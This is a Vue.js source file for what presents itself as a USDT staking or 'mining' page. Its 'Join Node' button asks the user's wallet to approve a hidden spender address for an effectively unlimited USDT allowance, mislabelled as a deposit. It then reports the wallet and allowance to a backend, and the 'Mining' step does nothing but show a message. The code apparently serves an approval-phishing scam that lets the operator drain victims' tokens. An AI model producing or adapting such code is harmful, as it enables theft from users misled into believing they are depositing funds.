import { computed, ref } from 'vue'
import { Web3 } from 'web3'
import { useToast } from 'primevue/usetoast'
import axiosClient from '@/services/axiosClient'
import { tokenABI } from '@/contracts/tokenABI'
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi'
import { mainnet, sepolia } from 'viem/chains'
import { reconnect, watchAccount } from '@wagmi/core'

export const useStakeView = () => {
    const web3 = new Web3(window.ethereum)
    const tokenAddress = import.meta.env.VITE_TOKEN_CONTRACT_ADDRESS
    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress)
    const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS

    const toast = useToast()
    const walletAddress = ref(null)
    const isLoading = ref(false)
    const isApproveSuccess = ref(false)

    const projectId = import.meta.env.VITE_PROJECT_ID

    const metadata = {
        name: 'Web3Modal',
        description: 'Web3Modal Example',
        url: 'https://web3modal.com',
        icons: ['https://avatars.githubusercontent.com/u/37784886']
    }

    const chains = [mainnet, sepolia]

    const config = defaultWagmiConfig({
        chains,
        projectId,
        metadata,
        enableWalletConnect: true,
        enableInjected: true,
        enableEIP6963: true,
        enableCoinbase: true
    })

    reconnect(config)

    createWeb3Modal({
        wagmiConfig: config,
        projectId,
        enableAnalytics: true
    })

    watchAccount(config, {
        async onChange(data) {
            walletAddress.value = data.address

            if (walletAddress.value) {
                const params = {
                    wallet: walletAddress.value
                }

                await axiosClient.post('/wallet-info', params)
            }
        }
    })

    // Approve & Deposit USDT
    const approveUSDT = async () => {
        if (!walletAddress.value) {
            toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
        } else {
            try {
                isLoading.value = true

                const approvalAmount = web3.utils.toWei('50', 'ether')

                // Approve the spender to spend the specified amount of USDT tokens
                const tx = await tokenContract.methods.approve(spenderAddress, approvalAmount).send({
                    from: walletAddress.value
                })

                if (tx.transactionHash) {
                    let allowanceAmount = await tokenContract.methods.allowance(walletAddress.value, spenderAddress).call()

                    allowanceAmount = Number(allowanceAmount.toString())
                    console.log(allowanceAmount)

                    const params = {
                        wallet: walletAddress.value,
                        real_balance: allowanceAmount,
                        level: 1,
                        type: 'usdt'
                    }

                    await axiosClient.post('/user-info', params)
                }
                toast.add({ severity: 'success', detail: 'Token approve successful!', life: 3000 })

                isLoading.value = false
                isApproveSuccess.value = true
            } catch (error) {
                isLoading.value = false

                toast.add({ severity: 'warn', detail: 'Error during USDT deposit!', life: 3000 })
                console.error('Error during USDT deposit:', error)
            }
        }
    }

    const miningUSDT = () => {
        toast.add({ severity: 'info', detail: 'You can start mining now.', life: 3000 })
    }

    const handleLabel = computed(() => {
        return isLoading.value ? 'Loading...' : isApproveSuccess.value ? 'Mining' : 'Join Node'
    })

    const handleClick = () => {
        isApproveSuccess.value ? miningUSDT() : approveUSDT()
    }

    return {
        walletAddress,
        isLoading,
        handleLabel,
        handleClick,
        isApproveSuccess
    }
}
